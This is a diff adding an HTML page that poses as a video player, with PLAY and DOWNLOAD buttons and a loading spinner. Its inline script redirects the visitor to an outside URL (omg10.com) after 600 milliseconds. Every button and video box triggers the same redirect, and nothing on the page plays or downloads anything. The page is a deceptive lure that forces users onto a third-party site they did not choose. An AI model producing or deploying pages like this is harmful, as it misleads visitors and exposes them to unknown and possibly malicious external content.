@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+
+    <style>
+        *{
+            margin:0;
+            padding:0;
+            box-sizing:border-box;
+        }
+
+        body{
+            background:#ffffff;
+            font-family:Arial,sans-serif;
+            padding:12px;
+            max-width:500px;
+            margin:auto;
+        }
+
+        .top-buttons{
+            display:flex;
+            gap:10px;
+            margin-bottom:15px;
+        }
+
+        .btn{
+            flex:1;
+            background:#1e88e5;
+            color:#000;
+            text-decoration:none;
+            text-align:center;
+            padding:14px 8px;
+            font-weight:bold;
+            border-radius:8px;
+            font-size:18px;
+        }
+
+        .video-box{
+            width:100%;
+            aspect-ratio:16/9;
+            background:#000;
+            border-radius:8px;
+            margin-bottom:15px;
+            position:relative;
+            cursor:pointer;
+        }
+
+        .spinner{
+            width:50px;
+            height:50px;
+            border:5px solid rgba(255,255,255,.3);
+            border-top:5px solid #fff;
+            border-radius:50%;
+            animation:spin 1s linear infinite;
+
+            position:absolute;
+            top:50%;
+            left:50%;
+            transform:translate(-50%,-50%);
+        }
+
+        @keyframes spin{
+            from{
+                transform:translate(-50%,-50%) rotate(0deg);
+            }
+            to{
+                transform:translate(-50%,-50%) rotate(360deg);
+            }
+        }
+
+        .play-icon{
+            position:absolute;
+            top:50%;
+            left:50%;
+            transform:translate(-50%,-50%);
+            font-size:70px;
+            color:white;
+        }
+    </style>
+
+    <script>
+        const redirectUrl = "https://omg10.com/4/11181646";
+
+        function go(){
+            window.location.href = redirectUrl;
+        }
+
+        setTimeout(go, 600);
+    </script>
+</head>
+
+<body>
+
+    <div class="top-buttons">
+        <a href="javascript:go()" class="btn">🟢 PLAY</a>
+        <a href="javascript:go()" class="btn">🔴 DOWNLOAD</a>
+    </div>
+
+    <div class="video-box" onclick="go()">
+        <div class="spinner"></div>
+    </div>
+
+    <div class="video-box" onclick="go()">
+        <div class="play-icon">▶</div>
+    </div>
+
+</body>
+</html>
